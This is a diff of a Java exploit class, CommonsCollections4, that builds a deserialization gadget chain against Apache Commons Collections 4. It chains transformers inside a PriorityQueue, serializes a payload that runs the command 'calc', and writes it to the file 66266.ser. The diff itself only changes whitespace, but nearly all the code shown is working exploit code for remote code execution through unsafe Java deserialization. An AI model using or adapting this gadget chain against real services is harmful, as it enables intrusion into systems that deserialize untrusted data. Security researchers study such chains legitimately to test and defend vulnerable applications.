@@ -19,8 +19,8 @@ import java.util.PriorityQueue;
 
 public class CommonsCollections4 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("66266.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("66266.ser");
         fous.write(bytes);
         fous.close();
     }
@@ -31,8 +31,8 @@ public class CommonsCollections4 {
         ConstantTransformer constant = new ConstantTransformer(String.class);
 
         // mock method name until armed
-        Class[] paramTypes = new Class[] { String.class };
-        Object[] args = new Object[] { "foo" };
+        Class[]  paramTypes = new Class[]{String.class};
+        Object[] args       = new Object[]{"foo"};
         InstantiateTransformer instantiate = new InstantiateTransformer(
                 paramTypes, args);
 
@@ -40,7 +40,7 @@ public class CommonsCollections4 {
         paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
         args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
 
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});
 
         // create queue with numbers
         PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
@@ -54,7 +54,7 @@ public class CommonsCollections4 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(queue);
         byte[] bytes = baous.toByteArray();
         oos.close();
